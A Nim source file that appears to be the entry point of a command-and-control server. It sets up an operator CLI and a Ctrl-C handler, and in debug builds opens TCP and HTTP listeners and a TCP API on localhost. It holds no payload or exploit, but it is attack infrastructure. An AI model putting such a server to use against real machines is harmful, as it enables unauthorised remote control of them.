import std/[
  asyncdispatch,
  asyncfutures,
]

import types, logging, cli, commands/commands

infoLog "initializing c2 server"

let server = C2Server(
  cli: C2Cli(
    handlingClient: @[],
    mode: MainMode,
    commands: commands.commands,
    waitingForOutput: false
  ),
  debug: false
)

proc ctrlc() {.noconv.} =
  if server.cli.interactive or not server.cli.initialized:
    quit 0
  else:
    for task in server.tasks:
      task.future[].complete()
setControlCHook(ctrlc)

when defined(debug):
  server.debug = true
  import listeners, tables
  var params: Table[string, string] 
  discard server.startListener(
    "tcp_1",
    tcpListener.listener,
    "127.0.0.1", Port 1337, params
  )
  discard server.startListener(
    "http_1",
    httpListener.listener,
    "127.0.0.1", Port 8080, params
  )
  
when defined(debug):
  # import httpapi/httpserver
  # asyncCheck startHttpAPI(server)
  import tcpApi
  asyncCheck startTcpApi(server)
asyncCheck procStdin(server)

runForever()
